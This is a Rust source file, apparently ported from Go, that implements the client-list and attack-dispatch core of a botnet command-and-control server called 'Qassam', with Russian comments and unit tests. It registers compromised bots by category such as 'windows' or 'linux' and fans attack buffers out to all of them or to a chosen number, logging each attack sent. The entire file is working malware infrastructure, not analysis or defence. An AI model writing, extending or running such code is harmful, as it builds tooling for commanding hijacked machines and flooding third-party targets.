use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::{mpsc, Mutex, RwLock};
use thiserror::Error;
use tokio::time::{interval, Duration};
use futures::future::join_all;

use crate::cnc::qassam::QassamBot;

#[derive(Error, Debug)]
pub enum QassamClientListError {
    #[error("Channel error: {0}")]
    Channel(String),
    #[error("Serialization error: {0}")]
    Serialization(String),
}

// Аналог AttackSend
#[derive(Debug, Clone)]
pub struct QassamAttackSend {
    pub buf: Vec<u8>,
    pub count: i32,
    pub bot_cata: String,
}

// Аналог ClientList
#[derive(Debug)]
pub struct QassamClientList {
    uid: Arc<Mutex<i32>>,
    count: Arc<Mutex<i32>>,
    clients: Arc<RwLock<HashMap<i32, QassamBot>>>,
    add_queue: mpsc::Sender<QassamBot>,
    del_queue: mpsc::Sender<QassamBot>,
    atk_queue: mpsc::Sender<QassamAttackSend>,
    total_count: mpsc::Sender<i32>,
    cnt_view: mpsc::Sender<mpsc::Sender<i32>>,
    dist_view_req: mpsc::Sender<mpsc::Sender<HashMap<String, i32>>>,
}

impl QassamClientList {
    pub async fn new() -> Result<Self, QassamClientListError> {
        let (add_tx, add_rx) = mpsc::channel(128);
        let (del_tx, del_rx) = mpsc::channel(128);
        let (atk_tx, atk_rx) = mpsc::channel(64);
        let (total_count_tx, total_count_rx) = mpsc::channel(64);
        let (cnt_view_tx, cnt_view_rx) = mpsc::channel(64);
        let (dist_view_req_tx, dist_view_req_rx) = mpsc::channel(64);

        let client_list = QassamClientList {
            uid: Arc::new(Mutex::new(0)),
            count: Arc::new(Mutex::new(0)),
            clients: Arc::new(RwLock::new(HashMap::new())),
            add_queue: add_tx,
            del_queue: del_tx,
            atk_queue: atk_tx,
            total_count: total_count_tx,
            cnt_view: cnt_view_tx.clone(),
            dist_view_req: dist_view_req_tx,
        };

        // Запускаем worker'ы
        client_list.start_fast_count_worker(total_count_rx, cnt_view_rx).await;
        client_list.start_worker(
            add_rx, del_rx, atk_rx,
            cnt_view_tx.clone(), dist_view_req_rx
        ).await;

        Ok(client_list)
    }

    pub async fn qassam_count(&self) -> Result<i32, QassamClientListError> {
        let (tx, mut rx) = mpsc::channel(1);
        self.cnt_view.send(tx).await
            .map_err(|e| QassamClientListError::Channel(e.to_string()))?;

        rx.recv().await
            .ok_or_else(|| QassamClientListError::Channel("Failed to receive count".to_string()))
    }

    pub async fn qassam_distribution(&self) -> Result<HashMap<String, i32>, QassamClientListError> {
        let (tx, mut rx) = mpsc::channel(1);
        self.dist_view_req.send(tx).await
            .map_err(|e| QassamClientListError::Channel(e.to_string()))?;

        rx.recv().await
            .ok_or_else(|| QassamClientListError::Channel("Failed to receive distribution".to_string()))
    }

    pub async fn qassam_add_client(&self, bot: QassamBot) -> Result<(), QassamClientListError> {
        self.add_queue.send(bot).await
            .map_err(|e| QassamClientListError::Channel(e.to_string()))
    }

    pub async fn qassam_del_client(&self, bot: QassamBot) -> Result<(), QassamClientListError> {
        self.del_queue.send(bot).await
            .map_err(|e| QassamClientListError::Channel(e.to_string()))
    }

    pub async fn qassam_queue_buf(&self, buf: Vec<u8>, max_bots: i32, bot_cata: &str) -> Result<(), QassamClientListError> {
        let attack = QassamAttackSend {
            buf,
            count: max_bots,
            bot_cata: bot_cata.to_string(),
        };

        self.atk_queue.send(attack).await
            .map_err(|e| QassamClientListError::Channel(e.to_string()))
    }

    async fn start_fast_count_worker(
        &self,
        mut total_count_rx: mpsc::Receiver<i32>,
        mut cnt_view_rx: mpsc::Receiver<mpsc::Sender<i32>>,
    ) {
        let count_ref = Arc::clone(&self.count);

        tokio::spawn(async move {
            let mut current_count = 0;

            loop {
                tokio::select! {
                    Some(delta) = total_count_rx.recv() => {
                        current_count += delta;
                        // Обновляем атомарный счетчик
                        if let Ok(mut count_guard) = count_ref.try_lock() {
                            *count_guard = current_count;
                        }
                    }
                    Some(response_chan) = cnt_view_rx.recv() => {
                        let _ = response_chan.send(current_count).await;
                    }
                    else => break,
                }
            }
        });
    }

    async fn start_worker(&self,mut add_rx: mpsc::Receiver<QassamBot>,mut del_rx: mpsc::Receiver<QassamBot>,mut atk_rx: mpsc::Receiver<QassamAttackSend>,cnt_view: mpsc::Sender<mpsc::Sender<i32>>, mut dist_view_req_rx: mpsc::Receiver<mpsc::Sender<HashMap<String, i32>>>) {
        let uid_ref = Arc::clone(&self.uid);
        let clients_ref = Arc::clone(&self.clients);
        let total_count_sender = self.total_count.clone();

        tokio::spawn(async move {
            let mut interval = interval(Duration::from_secs(30)); // Cleanup interval

            // Ограничитель одновременных задач
            let semaphore = Arc::new(tokio::sync::Semaphore::new(1000));

            loop {
                tokio::select! {
                // Обработка новых подключений
                Some(mut add) = add_rx.recv() => {
                    let uid_ref = Arc::clone(&uid_ref);
                    let clients_ref = Arc::clone(&clients_ref);
                    let total_count_sender = total_count_sender.clone();

                    tokio::spawn(async move {
                        // Присваиваем UID
                        let mut uid_guard = uid_ref.lock().await;
                        *uid_guard += 1;
                        add.uid = *uid_guard;
                        let uid = *uid_guard;
                        drop(uid_guard); // Освобождаем блокировку как можно скорее

                        // Добавляем в clients
                        {
                            let mut clients_guard = clients_ref.write().await;
                            clients_guard.insert(uid, add.clone());
                        }

                        // Обновляем счетчик
                        let _ = total_count_sender.send(1).await;

                        // Логируем подключение
                        if let Ok(addr) = add.conn.lock().await.peer_addr() {
                            println!("\x1b[1;37m[Qassam] \x1b[0;32mConnected \x1b[1;37m| IP Address:\x1b[0;32m {} ({}) UID: {}", addr, add.source, uid);
                        }
                    });
                }

                // Обработка отключений
                Some(del) = del_rx.recv() => {
                    let uid = del.uid;
                    let clients_ref = Arc::clone(&clients_ref);
                    let total_count_sender = total_count_sender.clone();

                    tokio::spawn(async move {
                        // Удаляем из clients
                        {
                            let mut clients_guard = clients_ref.write().await;
                            clients_guard.remove(&uid);
                        }

                        // Обновляем счетчик
                        let _ = total_count_sender.send(-1).await;

                        // Логируем отключение
                        if let Ok(addr) = del.conn.lock().await.peer_addr() {
                            println!("\x1b[1;37m[Qassam] \x1b[0;31mDisconnected \x1b[1;37m| IP Address:\x1b[0;32m {} ({}) UID: {}", addr, del.source, uid);
                        }
                    });
                }

                // Обработка атак
                Some(atk) = atk_rx.recv() => {
                    let clients_ref = Arc::clone(&clients_ref);
                    let semaphore = Arc::clone(&semaphore);

                    tokio::spawn(async move {
                        let clients_guard = clients_ref.read().await;

                        // Собираем подходящих ботов
                        let target_bots: Vec<QassamBot> = if atk.count == -1 {
                            // Все подходящие боты
                            clients_guard.iter()
                                .filter(|(_, v)| atk.bot_cata.is_empty() || atk.bot_cata == v.source)
                                .map(|(_, v)| v.clone())
                                .collect()
                        } else {
                            // Ограниченное количество
                            clients_guard.iter()
                                .filter(|(_, v)| atk.bot_cata.is_empty() || atk.bot_cata == v.source)
                                .take(atk.count as usize)
                                .map(|(_, v)| v.clone())
                                .collect()
                        };

                        drop(clients_guard); // Освобождаем блокировку

                        if target_bots.is_empty() {
                            eprintln!("[WARN] No suitable bots found for attack");
                            return;
                        }

                        println!("[INFO] Sending attack to {} bots", target_bots.len());

                        // Ограничиваем количество одновременных задач
                        let mut tasks = Vec::new();

                        // ИСПРАВЛЕНИЕ: используем into_iter() вместо & для владения
                        for bot in target_bots.clone().into_iter() {
                            let permit = semaphore.clone().acquire_owned().await;
                            let buf_clone = atk.buf.clone();

                            let task = tokio::spawn(async move {
                                let _permit = permit; // Удерживаем разрешение до завершения задачи

                                match bot.qassam_queue_buf(&buf_clone).await {
                                    Ok(_) => {
                                        // Тихий успех - не логируем каждый успешный пакет
                                    }
                                    Err(e) => {
                                        eprintln!("Failed to send buffer to bot {}: {}", bot.uid, e);
                                    }
                                }
                            });

                            tasks.push(task);
                        }

                        // Ждем завершения всех задач с таймаутом
                        match tokio::time::timeout(
                            Duration::from_secs(30),
                            join_all(tasks)
                        ).await {
                            Ok(_) => {
                                println!("[SUCCESS] Attack completed for {} bots", target_bots.len());
                            }
                            Err(_) => {
                                eprintln!("[WARN] Attack timeout for some bots");
                            }
                        }
                    });
                }

                // Запрос статистики распределения
                Some(response_chan) = dist_view_req_rx.recv() => {
                    let clients_ref = Arc::clone(&clients_ref);

                    tokio::spawn(async move {
                        let clients_guard = clients_ref.read().await;
                        let mut res = HashMap::new();

                        for (_, v) in clients_guard.iter() {
                            *res.entry(v.source.clone()).or_insert(0) += 1;
                        }

                        let _ = response_chan.send(res).await;
                    });
                }

                // Периодическая очистка
                _ = interval.tick() => {
                    // Можно добавить периодическую очистку неактивных ботов
                    // или другие maintenance задачи
                }

                // Завершение работы при закрытии всех каналов
                else => {
                    println!("[INFO] Worker shutting down");
                    break;
                }
            }
            }
        });
    }

    // Дополнительные методы для тестирования
    pub async fn get_client_count_direct(&self) -> usize {
        let clients_guard = self.clients.read().await;
        clients_guard.len()
    }

    pub async fn get_uid_counter(&self) -> i32 {
        let uid_guard = self.uid.lock().await;
        *uid_guard
    }
}



// Реализация Default для удобства тестирования
impl Default for QassamClientList {
    fn default() -> Self {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async {
                Self::new().await.expect("Failed to create default QassamClientList")
            })
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpStream;
    use tokio::net::TcpListener;

    // Вспомогательная функция для создания тестового бота
    async fn create_test_bot(source: &str) -> QassamBot {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let stream = TcpStream::connect(addr).await.unwrap();
        let _server = listener.accept().await.unwrap();

        QassamBot::qassam_new(stream, 1, source.to_string())
    }

    #[tokio::test]
    async fn test_client_list_creation() {
        let client_list = QassamClientList::new().await;
        assert!(client_list.is_ok());

        let client_list = client_list.unwrap();
        assert_eq!(client_list.get_uid_counter().await, 0);
        assert_eq!(client_list.get_client_count_direct().await, 0);
    }

    #[tokio::test]
    async fn test_add_and_remove_clients() {
        let client_list = QassamClientList::new().await.unwrap();

        // Добавляем клиента
        let bot1 = create_test_bot("source1").await;
        client_list.qassam_add_client(bot1).await.expect("Failed to add client");

        // Даем время воркеру обработать
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        assert_eq!(client_list.get_client_count_direct().await, 1);
        assert_eq!(client_list.get_uid_counter().await, 1);

        // Проверяем счетчик через метод
        let count = client_list.qassam_count().await.expect("Failed to get count");
        assert_eq!(count, 1);

        // Добавляем второго клиента
        let bot2 = create_test_bot("source2").await;
        client_list.qassam_add_client(bot2).await.expect("Failed to add client");

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        assert_eq!(client_list.get_client_count_direct().await, 2);
        assert_eq!(client_list.qassam_count().await.unwrap(), 2);

        // Удаляем клиента
        let bot_to_remove = create_test_bot("source1").await;
        client_list.qassam_del_client(bot_to_remove).await.expect("Failed to remove client");

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        assert_eq!(client_list.get_client_count_direct().await, 1);
    }

    #[tokio::test]
    async fn test_distribution() {
        let client_list = QassamClientList::new().await.unwrap();

        // Добавляем клиентов из разных источников
        let bot1 = create_test_bot("source_a").await;
        let bot2 = create_test_bot("source_b").await;
        let bot3 = create_test_bot("source_a").await; // Еще один из source_a

        client_list.qassam_add_client(bot1).await.unwrap();
        client_list.qassam_add_client(bot2).await.unwrap();
        client_list.qassam_add_client(bot3).await.unwrap();

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        let distribution = client_list.qassam_distribution().await.expect("Failed to get distribution");

        assert_eq!(distribution.get("source_a"), Some(&2));
        assert_eq!(distribution.get("source_b"), Some(&1));
        assert_eq!(distribution.len(), 2);
    }

    #[tokio::test]
    async fn test_queue_buf_to_all() {
        let client_list = QassamClientList::new().await.unwrap();

        // Добавляем несколько клиентов
        let bot1 = create_test_bot("windows").await;
        let bot2 = create_test_bot("linux").await;
        let bot3 = create_test_bot("windows").await;

        client_list.qassam_add_client(bot1).await.unwrap();
        client_list.qassam_add_client(bot2).await.unwrap();
        client_list.qassam_add_client(bot3).await.unwrap();

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        // Отправляем всем ботам
        let test_data = vec![0x01, 0x02, 0x03, 0x04];
        client_list.qassam_queue_buf(test_data, -1, "").await.expect("Failed to queue buffer");

        // Даем время на обработку
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        // Проверяем что все клиенты все еще на месте
        assert_eq!(client_list.get_client_count_direct().await, 3);
    }

    #[tokio::test]
    async fn test_queue_buf_to_specific_category() {
        let client_list = QassamClientList::new().await.unwrap();

        // Добавляем клиентов разных категорий
        let bot1 = create_test_bot("windows").await;
        let bot2 = create_test_bot("linux").await;
        let bot3 = create_test_bot("windows").await;

        client_list.qassam_add_client(bot1).await.unwrap();
        client_list.qassam_add_client(bot2).await.unwrap();
        client_list.qassam_add_client(bot3).await.unwrap();

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        // Отправляем только windows ботам
        let test_data = vec![0x05, 0x06, 0x07, 0x08];
        client_list.qassam_queue_buf(test_data, -1, "windows").await.expect("Failed to queue buffer");

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        // Проверяем распределение
        let distribution = client_list.qassam_distribution().await.unwrap();
        assert_eq!(distribution.get("windows"), Some(&2));
        assert_eq!(distribution.get("linux"), Some(&1));
    }

    #[tokio::test]
    async fn test_queue_buf_limited_count() {
        let client_list = QassamClientList::new().await.unwrap();

        // Добавляем клиентов
        for i in 0..5 {
            let bot = create_test_bot(&format!("source{}", i)).await;
            client_list.qassam_add_client(bot).await.unwrap();
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        // Отправляем только 2 ботам
        let test_data = vec![0x09, 0x0A];
        client_list.qassam_queue_buf(test_data, 2, "").await.expect("Failed to queue buffer");

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        // Проверяем что все клиенты остались
        assert_eq!(client_list.get_client_count_direct().await, 5);
    }

    #[tokio::test]
    async fn test_concurrent_operations() {
        let client_list = Arc::new(QassamClientList::new().await.unwrap());

        let mut handles = vec![];

        // Запускаем несколько задач для добавления клиентов
        for i in 0..10 {
            let client_list_clone = Arc::clone(&client_list);
            let handle = tokio::spawn(async move {
                let bot = create_test_bot(&format!("concurrent_source_{}", i)).await;
                client_list_clone.qassam_add_client(bot).await
            });
            handles.push(handle);
        }

        // Ждем завершения всех задач
        for handle in handles {
            handle.await.unwrap().unwrap();
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;

        // Проверяем результат
        assert_eq!(client_list.get_client_count_direct().await, 10);
        assert_eq!(client_list.qassam_count().await.unwrap(), 10);

        let distribution = client_list.qassam_distribution().await.unwrap();
        assert_eq!(distribution.len(), 10);
    }

    #[tokio::test]
    async fn test_error_handling() {
        let client_list = QassamClientList::new().await.unwrap();

        // Тест с пустыми данными (должен работать)
        let empty_data = vec![];
        let result = client_list.qassam_queue_buf(empty_data, 1, "").await;
        assert!(result.is_ok());

        // Тест с несуществующей категорией (должен работать, но никому не отправит)
        let test_data = vec![0x01, 0x02];
        let result = client_list.qassam_queue_buf(test_data, 1, "nonexistent").await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_uid_increment() {
        let client_list = QassamClientList::new().await.unwrap();

        let initial_uid = client_list.get_uid_counter().await;
        assert_eq!(initial_uid, 0);

        // Добавляем клиентов и проверяем UID
        for i in 1..=5 {
            let bot = create_test_bot("test_source").await;
            client_list.qassam_add_client(bot).await.unwrap();

            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;

            let current_uid = client_list.get_uid_counter().await;
            assert_eq!(current_uid, i);
        }
    }

    #[tokio::test]
    async fn test_channel_capacity() {
        // Тестируем что каналы имеют правильную емкость
        let client_list = QassamClientList::new().await.unwrap();

        // Быстро добавляем много клиентов (больше чем емкость канала)
        let mut handles = vec![];
        for i in 0..150 { // Больше чем 128 (емкость add_queue)
            let client_list_clone = Arc::new(client_list.clone());
            let handle = tokio::spawn(async move {
                let bot = create_test_bot(&format!("mass_source_{}", i)).await;
                client_list_clone.qassam_add_client(bot).await
            });
            handles.push(handle);
        }

        // Ждем завершения
        for handle in handles {
            let _ = handle.await; // Некоторые могут таймаутить, это нормально
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

        // Должны добавиться все клиенты, несмотря на емкость канала
        let count = client_list.get_client_count_direct().await;
        assert!(count > 0); // По крайней мере некоторые добавились
    }

    // Тест для проверки что клонирование работает
    #[tokio::test]
    async fn test_clone() {
        let client_list = QassamClientList::new().await.unwrap();
        let cloned = client_list.clone();

        // Оба должны работать независимо
        let bot1 = create_test_bot("original").await;
        client_list.qassam_add_client(bot1).await.unwrap();

        let bot2 = create_test_bot("cloned").await;
        cloned.qassam_add_client(bot2).await.unwrap();

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

        assert_eq!(client_list.get_client_count_direct().await, 2);
        assert_eq!(cloned.get_client_count_direct().await, 2);
    }
}

// Реализация Clone для QassamClientList
impl Clone for QassamClientList {
    fn clone(&self) -> Self {
        Self {
            uid: Arc::clone(&self.uid),
            count: Arc::clone(&self.count),
            clients: Arc::clone(&self.clients),
            add_queue: self.add_queue.clone(),
            del_queue: self.del_queue.clone(),
            atk_queue: self.atk_queue.clone(),
            total_count: self.total_count.clone(),
            cnt_view: self.cnt_view.clone(),
            dist_view_req: self.dist_view_req.clone(),
        }
    }
}









